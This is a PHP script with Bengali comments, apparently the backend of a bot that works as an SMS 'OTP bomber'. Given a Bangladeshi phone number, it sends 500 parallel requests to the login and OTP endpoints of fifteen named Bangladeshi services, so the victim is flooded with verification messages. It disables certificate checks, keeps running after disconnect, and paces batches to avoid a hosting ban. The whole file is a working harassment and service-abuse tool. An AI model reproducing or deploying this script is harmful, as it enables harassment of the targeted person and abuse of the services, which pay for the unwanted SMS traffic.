<?php
header('Content-Type: application/json');
error_reporting(0);
ini_set('display_errors', 0); 
set_time_limit(0); 
ignore_user_abort(true); // বট ডিসকানেক্ট হলেও ব্যাকগ্রাউন্ডে কাজ চলবে

$phone = $_GET['phone'] ?? '';

if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status" => "error", "message" => "Invalid phone number."]));
}

// ফোন ফরমেটিং
$phone_11 = preg_replace('/^\+?88/', '', $phone); 
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;
$phone_88 = "88" . $phone_11;             
$phone_plus88 = "+88" . $phone_11;        
$deepto_number = "+880" . substr($phone_11, -10); 
$phone_osudpotro = "+88-" . $phone_11;    

// ==========================================
// 🔴 এপিআই মাস্টার লিস্ট (তোর দেওয়া সব সার্ভিস)
// ==========================================
$base_apis = [
    ["name"=>"ali2bd", "url"=>"https://edge.ali2bd.com/api/consumer/v1/auth/login", "method"=>"POST", "data"=>["username"=>$phone_11]],
    ["name"=>"hishabee", "url"=>"https://api.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88", "method"=>"POST"],
    ["name"=>"redx", "url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "method"=>"POST", "data"=>["phoneNumber"=>$phone_11]],
    ["name"=>"bikroy", "url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", "method"=>"GET"],
    ["name"=>"chardike", "url"=>"https://api.chardike.com/api/otp/send", "method"=>"POST", "data"=>["phone"=>$phone_11, "otp_type"=>"login"]],
    ["name"=>"bohubrihi", "url"=>"https://bb-api.bohubrihi.com/public/activity/otp", "method"=>"POST", "data"=>["phone"=>$phone_11, "intent"=>"login"]],
    ["name"=>"rokomari", "url"=>"https://www.rokomari.com/otp/send?emailOrPhone=".$phone_88."&countryCode=BD", "method"=>"GET"],
    ["name"=>"airtel", "url"=>"https://api.bd.airtel.com/v1/account/login/otp", "method"=>"POST", "data"=>["phone_number"=>$phone_11]],
    ["name"=>"ostad", "url"=>"https://api.ostad.app/api/v2/user/with-otp", "method"=>"POST", "data"=>["msisdn"=>$phone_11]],
    ["name"=>"prothomalo", "url"=>"https://prod-api.viewlift.com/identity/signup?site=prothomalo", "method"=>"POST", "data"=>["requestType"=>"send", "phoneNumber"=>$phone_plus88]],
    ["name"=>"shadhin", "url"=>"https://connect.shadhinmusic.com/v1/api//otp/send", "method"=>"POST", "data"=>["msisdn"=>$phone_88]],
    ["name"=>"rabbithole", "url"=>"https://apix.rabbitholebd.com/appv2/login/requestOTP", "method"=>"POST", "data"=>["mobile"=>"+88".$phone_11]],
    ["name"=>"ghoorilearning", "url"=>"https://api.ghoorilearning.com/api/auth/signup/otp", "method"=>"POST", "data"=>["mobile_no"=>$phone_11]],
    ["name"=>"eonbazar", "url"=>"https://app.eonbazar.com/api/auth/register", "method"=>"POST", "data"=>["mobile"=>$phone_11, "name"=>"TeamDCG"]],
    ["name"=>"grameenphone", "url"=>"https://weblogin.grameenphone.com/backend/api/v1/otp", "method"=>"POST", "data"=>["msisdn"=>$phone_11]]
];

// ==========================================
// ⚡ ৫০০ রিকোয়েস্ট সেটআপ (Batch Processing)
// ==========================================
$total_target = 500;
$api_queue = [];

// ৫০০টি রিকোয়েস্ট কিউতে সাজানো হলো
for ($i = 0; $i < $total_target; $i++) {
    $api_queue[] = $base_apis[$i % count($base_apis)];
}

// ২৫টি করে একবারে ফায়ার হবে (সার্ভার লোড ব্যালেন্স করার জন্য)
$batches = array_chunk($api_queue, 25);
$success_count = 0;

foreach ($batches as $batch) {
    $mh = curl_multi_init();
    $curl_handles = [];

    // ব্যাচের ২৫টি রিকোয়েস্ট একবারে রেডি করা হচ্ছে
    foreach ($batch as $api) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api['url']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10); // ১০ সেকেন্ডের বেশি অপেক্ষা করবে না
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        $headers = ['User-Agent: Mozilla/5.0', 'Content-Type: application/json'];
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        if (isset($api['method']) && $api['method'] === "POST") {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data'] ?? []));
        } else {
            curl_setopt($ch, CURLOPT_HTTPGET, true);
        }

        curl_multi_add_handle($mh, $ch);
        $curl_handles[] = $ch;
    }

    // ২৫টি রিকোয়েস্ট প্যারালালি এক্সিকিউট হচ্ছে
    $running = null;
    do {
        curl_multi_exec($mh, $running);
        curl_multi_select($mh);
    } while ($running > 0);

    // হ্যান্ডেল ক্লোজ করা এবং কাউন্ট বাড়ানো
    foreach ($curl_handles as $ch) {
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($http_code > 0) {
            $success_count++; // রিকোয়েস্ট সার্ভার পর্যন্ত পৌঁছালে কাউন্ট হবে
        }
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }
    curl_multi_close($mh);

    // প্রতি ২৫টা রিকোয়েস্ট যাওয়ার পর মাত্র ০.২ সেকেন্ড গ্যাপ (হোস্টিং যেন ব্যান না খায়)
    usleep(200000); 
}

// ==========================================
// 🚀 বটের জন্য ফাইনাল আউটপুট
// ==========================================
echo json_encode([
    "status" => "success",
    "message" => "Task Completed Successfully!",
    "target_requests" => $total_target,
    "completed_requests" => $success_count
], JSON_PRETTY_PRINT);
